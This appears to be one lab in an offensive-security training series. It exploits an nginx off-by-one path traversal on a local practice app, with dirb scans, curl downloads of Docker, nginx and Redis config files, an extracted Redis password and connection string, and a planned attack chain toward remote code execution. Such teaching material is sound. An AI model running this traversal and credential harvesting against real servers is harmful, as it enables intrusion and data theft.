# Lab 04 - Extract Docker Configuration Files

## Objective

Use dirb to find docker config files and download Dockerfile. Find the Redis server and password.

## Background

We have a hunch that this the redis database service is being served by a container. Let's use dirb (while using our path traversal expoit) against a list of common docker files to see if we 
can find any.


## Steps

### 1. Try a new dirb scan using our common-docker.txt file:


```bash
dirb http://localhost:8080/static../ common-docker.txt
```

**Expected discoveries:**
```
+ http://localhost:8080/static../Dockerfile (CODE:200|SIZE:439)
+ http://localhost:8080/static../docker-compose.yml (CODE:200|SIZE:584)
+ http://localhost:8080/static../nginx.conf (CODE:200|SIZE:353)
+ http://localhost:8080/static../redis.conf (CODE:200|SIZE:37)

```

### 2. Download and Examine Docker,NGINX and Redis config files

Retrieve the Docker, NGINX, and Redis config files:

```bash
curl http://localhost:8080/static../Dockerfile -o Dockerfile

curl http://localhost:8080/static../docker-compose.yml -o docker-compose.yml

curl http://localhost:8080/static../nginx.conf -o nginx.conf

curl http://localhost:8080/static../redis.conf -o redis.conf

```

Let's examine the contents of our Dockerfile, which contains the configuration for our app.py server:

```bash
cat Dockerfile
```
```Dockerfile
FROM python:3.13-slim

# Redis password variable
ARG REDIS_PASSWORD="hCQr7gvbyRRN79Ugvc9Lssq6"
ARG REDIS_CONTAINER="resumecrunch-redis"
ARG OPENAI_API_KEY="sk-yourkeyhere"

WORKDIR /app

# Install Python dependencies

# Copy application files
COPY . /app/

RUN pip install -r /app/requirements.txt

ENV OPENAI_API_KEY=${OPENAI_API_KEY}
ENV REDIS_PASSWORD=${REDIS_PASSWORD}
ENV REDIS_CONTAINER=${REDIS_CONTAINER}

CMD ["python3", "app.py"]
```

We have our redis container name and password!

```
resumecrunch-redis
hCQr7gvbyRRN79Ugvc9Lssq6
```


### 3. Create a Complete Infrastructure Map

Visualize the complete architecture:

```
=== ResumeCrunch Infrastructure Map ===

┌─────────────────────────────────────────┐
│         External (localhost:8080)       │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Nginx Container (resumecrunch-nginx)   │
│  - Port: 80 (mapped to 8080)            │
│  - Vulnerability: Path traversal on     │
│    /static location (off-by-one slash)  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Flask App (resumecrunch-app)           │
│  - python:3.13-slim                     │
│  - Flask framework                      │
│  - Port: 5000 (internal)                │
│  - Upload folder: /app/resumes          │
│  - Uses: Flask-Caching                  │
└──────────────┬──────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────┐
│  Redis (resumecrunch-redis)             │
│  - Port: 6379 (exposed to host)         │
│  - Password: hCQr7gvbyRRN79Ugvc9Lssq6   │
│  - Database: 0                          │
│  - Stores: Cached session data          │
└─────────────────────────────────────────┘

Attack Surface:
1. Nginx path traversal -> Full source disclosure
2. Redis port exposed -> Direct DB access
3. Flask-Caching -> Potential cache poisoning
4. Upload functionality -> Potential file upload attacks

```

## Verification Checklist

- [ ] Created custom Docker wordlist
- [ ] Ran `dirb` against `/static../` with Docker wordlist
- [ ] Downloaded `Dockerfile`
- [ ] Downloaded `docker-compose.yml`
- [ ] Downloaded `nginx.conf`
- [ ] Downloaded `redis.conf`
- [ ] Downloaded complete `requirements.txt`
- [ ] Extracted Redis password from configuration files
- [ ] Identified all container names and network configuration
- [ ] Found all exposed ports
- [ ] Confirmed Nginx misconfiguration in `nginx.conf`
- [ ] Tested Redis connectivity on port 6379
- [ ] Successfully authenticated to Redis (if accessible)
- [ ] Documented complete infrastructure architecture
- [ ] Compiled all credentials and sensitive information

## Key Discoveries Summary

By the end of this lab, you should have extracted:

### 1. Docker Configuration Files
- `Dockerfile` - Container build instructions
- `docker-compose.yml` - Multi-container orchestration
- `nginx.conf` - Web server configuration (with vulnerability)
- `redis.conf` - Redis server configuration

### 2. Application Files
- `app.py` - Complete Flask application source
- `requirements.txt` - All Python dependencies with versions

### 3. Credentials & Configuration
- **Redis password**: Extracted from docker-compose.yml or redis.conf
- **Container names**: All service container names
- **Network configuration**: Internal networking setup
- **Port mappings**: External to internal port mappings

### 4. Infrastructure Details
- **DB connection string**: `redis://hCQr7gvbyRRN79Ugvc9Lssq6@resumecrunch-redis:6379/0`
- **Upload folder path**: `/app/resumes`
- **Redis port**: 6379 (accessible from host)
- **Application port**: 5000 (internal)

### 5. Confirmed Vulnerabilities
- ✓ Nginx off-by-one slash path traversal
- ✓ Complete source code disclosure
- ✓ Configuration files exposed
- ✓ Redis port exposed to host
- ✓ Credentials hardcoded in config files

## Questions to Answer

1. What is the Redis password?
2. What container name does Redis use?
3. Is Redis port 6379 accessible from the host?
4. Can you authenticate to Redis with the discovered password?
5. What line in `nginx.conf` causes the path traversal vulnerability?
6. What Python version is the application using?
7. Where are uploaded resumes stored?
8. Are there any environment variables with sensitive data?

## Security Impact

**Severity:** CRITICAL

**Discovered Issues:**
1. **Complete Infrastructure Disclosure**: Full architecture exposed
2. **Credential Exposure**: Redis password and database details
3. **Configuration Exposure**: All service configurations accessible
4. **Direct Database Access**: Redis accessible from host
5. **Source Code Disclosure**: Entire application logic revealed

**Attack Chain Enabled:**
- Path traversal → Source disclosure → Credential extraction → Direct Redis access → Cache poisoning → RCE

## Next Steps

With complete infrastructure knowledge and Redis credentials, proceed to [Lab 05 - Test for Known Vulnerabilities](lab-05-test-vulns.md) to:
- Further analyze `app.py` for Redis usage patterns
- Verify resume upload folder accessibility
- Run `pip-audit-extra` on `requirements.txt`
- Identify Flask-Caching CVE-2021-33026 (pickle deserialization RCE)
- Prepare exploitation strategy

---

[← Previous: Path Traversal Discovery](lab-03-path-traversal.md) | [Next: Test for Known Vulnerabilities →](lab-05-test-vulns.md)
